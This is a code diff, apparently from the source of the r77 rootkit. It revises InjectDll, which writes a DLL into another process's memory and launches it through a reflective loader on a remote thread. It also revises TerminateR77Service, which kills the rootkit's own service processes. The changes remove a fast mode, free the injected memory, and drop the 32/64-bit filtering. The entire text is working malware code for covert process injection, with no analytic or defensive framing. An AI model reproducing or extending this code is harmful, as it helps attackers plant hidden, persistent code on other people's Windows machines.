@@ -4,7 +4,7 @@
 #include <Shlwapi.h>
 #include <Psapi.h>
 
-BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
+BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize)
 {
 	BOOL result = FALSE;
 
@@ -53,13 +53,7 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 									HANDLE thread = NULL;
 									if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
 									{
-										if (fast)
-										{
-											// Fast mode is for bulk operations, where the return value of this function is ignored.
-											// The return value of DllMain is not checked. This function just returns TRUE, if NtCreateThreadEx succeeded.
-											result = TRUE;
-										}
-										else if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
+										if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
 										{
 											// Return TRUE, only if DllMain returned TRUE.
 											// DllMain returns FALSE, for example, if r77 is already injected.
@@ -67,6 +61,12 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 											if (GetExitCodeThread(thread, &exitCode))
 											{
 												result = exitCode != 0;
+											}
+
+											// The reflective loader will no longer need the DLL file.
+											if (!VirtualFreeEx(process, allocatedMemory, 0, MEM_RELEASE))
+											{
+												result = FALSE;
 											}
 										}
 
@@ -207,7 +207,7 @@ VOID DetachAllInjectedProcesses()
 
 	FREE(r77Processes);
 }
-VOID TerminateR77Service(DWORD excludedProcessId, BOOL include32BitProcess, BOOL include64BitProcess)
+VOID TerminateR77Service(DWORD excludedProcessId)
 {
 	PR77_PROCESS r77Processes = NEW_ARRAY(R77_PROCESS, 1000);
 	DWORD r77ProcessCount = 1000;
@@ -217,18 +217,11 @@ VOID TerminateR77Service(DWORD excludedProcessId, BOOL include32BitProcess, BOOL
 		{
 			if (r77Processes[i].Signature == R77_SERVICE_SIGNATURE && r77Processes[i].ProcessId != excludedProcessId)
 			{
-				BOOL is64Bit;
-				if (Is64BitProcess(r77Processes[i].ProcessId, &is64Bit))
+				HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, r77Processes[i].ProcessId);
+				if (process)
 				{
-					if (is64Bit && include64BitProcess || !is64Bit && include32BitProcess)
-					{
-						HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, r77Processes[i].ProcessId);
-						if (process)
-						{
-							TerminateProcess(process, 0);
-							CloseHandle(process);
-						}
-					}
+					TerminateProcess(process, 0);
+					CloseHandle(process);
 				}
 			}
 		}
